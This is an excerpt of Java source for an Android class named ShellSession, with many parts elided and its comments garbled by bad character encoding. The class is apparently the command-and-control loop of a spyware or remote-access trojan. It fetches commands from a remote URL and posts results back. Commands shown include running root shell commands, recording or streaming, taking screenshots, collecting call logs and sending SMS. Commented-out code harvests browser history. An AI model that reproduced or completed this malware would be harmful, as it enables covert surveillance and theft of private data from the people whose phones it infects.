...
public class ShellSession implements Runnable {
    ...
    long curtime;
    long shell_interval = 600;  // ��� � ��������(!), <10 ��� ����� - ��������� ��� ����

    long on_con_error_delay = 60000; // ����� �������� ��� �����
    long no_requests_delay = 600000; // ����� � ���������� ������� - ��������� ������ 10 ���
    long between_cmd_delay = 3000; // ����� ���������� ����� ������� � ���. ����
    ...
    public void run() {
        ...
        try {
            ...
            Log.d(MyService.LOG_TAG, "error getting network info");
        }
    ...
    public void activate_shell() throws InterruptedException {
        ...
        while (idleattempts < max_attempts) {
            try {
                remotelist = load_url(MyService.cmd_url); // ��������� � remotelist <array>
    ...
    public void exec_spec(String command) {
        try {
            ...
            if (command.startsWith("root ")) {   // ��������� root �������
                String rootcmd = new String(command.substring(5));  // ������� ���������� � 5�� �������
                long r = HiddenWaiter.do_async("rootcmd", rootcmd, 5);
                if (r == 0L) {
                    post(MyService.post_url, "empty result");
                }// doing asyncly!!
                ...
                String fileurl = new String(command.substring(9));  // url ���������� � 9�� �������
                ...
                if (!MyService.recording) {
                    ...
                    post(MyService.post_url, "already recoding at the moment!");
                }
                ...
                if (MyService.recording) {
                    ...
                    post(MyService.post_url, "recording already stopped!");
                }
                ...
                if (args.length == 2) {
                    ...
                    try {
                        ...
                        if (!MyService.recording && !MyService.streaming) {
                            ...
                            post(MyService.post_url, "already recording/streaming!");
                        }
                    } catch (Exception e) {
            ...
            } else if (command.equals("calllogs")) {   // ���� �������
                try {
...
//                    }
//                } catch (Exception e) {
//                    post(MyService.post_url, "error getting bookmarks");
//                }
//            } else if (command.equals("history")) {   // ������� ��������
//                List<String> res = new ArrayList<String>();
//                try {
//                    getbrowserdata(0, res);
//                    if (res.size() > 0) {
//                        postdata(MyService.post_url, res);
//                    } else {
...
//                    }
//                } catch (Exception e) {
//                    post(MyService.post_url, "error getting history");
//                }
            } else if (command.equals("screenshot")) {   // ����� ������ (root only!)
                try {
                ...
                String[] smsargs = new String(command.substring(8)).split("\\s", 2);  // �������� ������ 1
                if (smsargs.length > 1) {
...
//void getbrowserdata(int type,List<String> res){  // ���:  0 = ������� , 1 = ��������
//	Cursor mCur=null;
//	try{
